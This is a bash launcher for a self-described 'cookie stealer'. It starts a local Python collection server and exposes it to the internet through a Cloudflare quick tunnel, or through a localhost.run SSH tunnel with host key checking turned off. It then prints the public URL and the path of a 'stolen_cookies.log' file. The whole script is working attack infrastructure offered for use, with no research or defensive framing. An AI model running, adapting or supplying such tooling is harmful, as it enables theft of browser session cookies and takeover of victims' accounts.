#!/bin/bash

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${BLUE}========================================${NC}"
echo -e "${GREEN}  DEEPHAT COOKIE STEALER ACTIVE         ${NC}"
echo -e "${BLUE}========================================${NC}"
echo ""

# Start the Python server in the background
echo -e "${BLUE}[*] Starting Local Server on port 8080...${NC}"
python3 server.py &
SERVER_PID=$!
sleep 2

TUNNEL_URL=""
TUNNEL_PID=""

# --- Attempt 1: Cloudflare Quick Tunnel ---
if command -v cloudflared &> /dev/null; then
    echo -e "${GREEN}[+] cloudflared detected. Creating trycloudflare tunnel...${NC}"
    cloudflared tunnel --url http://localhost:8080 2> cloudflared.log &
    TUNNEL_PID=$!
    
    for i in $(seq 1 15); do
        if grep -qE "https://[a-z0-9-]+\.trycloudflare\.com" cloudflared.log 2>/dev/null; then
            TUNNEL_URL=$(grep -oE "https://[a-z0-9-]+\.trycloudflare\.com" cloudflared.log | head -n 1)
            break
        fi
        sleep 1
    done
    
    if [ -z "$TUNNEL_URL" ]; then
        echo -e "${YELLOW}[!] cloudflared tunnel failed. Trying fallback...${NC}"
        kill $TUNNEL_PID 2>/dev/null
        TUNNEL_PID=""
        rm -f cloudflared.log
    fi
fi

# --- Attempt 2: localhost.run via SSH ---
if [ -z "$TUNNEL_URL" ] && command -v ssh &> /dev/null; then
    echo -e "${YELLOW}[+] Trying localhost.run (SSH tunnel)...${NC}"
    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:8080 nokey@localhost.run 2> ssh_tunnel.log &
    TUNNEL_PID=$!
    
    for i in $(seq 1 15); do
        if grep -qE "https?://[a-z0-9-]+\.lhr\.life" ssh_tunnel.log 2>/dev/null; then
            TUNNEL_URL=$(grep -oE "https?://[a-z0-9-]+\.lhr\.life" ssh_tunnel.log | head -n 1)
            break
        fi
        sleep 1
    done
    
    if [ -z "$TUNNEL_URL" ]; then
        echo -e "${YELLOW}[!] localhost.run tunnel failed.${NC}"
        kill $TUNNEL_PID 2>/dev/null
        TUNNEL_PID=""
        rm -f ssh_tunnel.log
    fi
fi

# --- Display Results ---
echo ""
echo "========================================"
echo "  YOUR PUBLIC URL"
echo "========================================"
if [ -n "$TUNNEL_URL" ]; then
    echo -e "${GREEN}${TUNNEL_URL}${NC}"
else
    LOCAL_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
    if [ -z "$LOCAL_IP" ]; then
        LOCAL_IP=$(ip -4 addr show 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v '127.0.0.1' | head -1)
    fi
    if [ -n "$LOCAL_IP" ]; then
        echo -e "${YELLOW}http://${LOCAL_IP}:8080${NC}"
    else
        echo -e "${YELLOW}http://localhost:8080${NC}"
    fi
    echo -e "${YELLOW}(No public tunnel. Same-network access only.)${NC}"
fi
echo ""
echo "========================================"
echo -e "${BLUE}  LOG FILE: $(pwd)/stolen_cookies.log${NC}"
echo -e "${BLUE}  Press Ctrl+C to stop.${NC}"
echo "========================================"

# Trap Ctrl+C
trap "kill $SERVER_PID $TUNNEL_PID 2>/dev/null; echo -e '\n${GREEN}[+] Server stopped.${NC}'; exit" INT TERM

wait
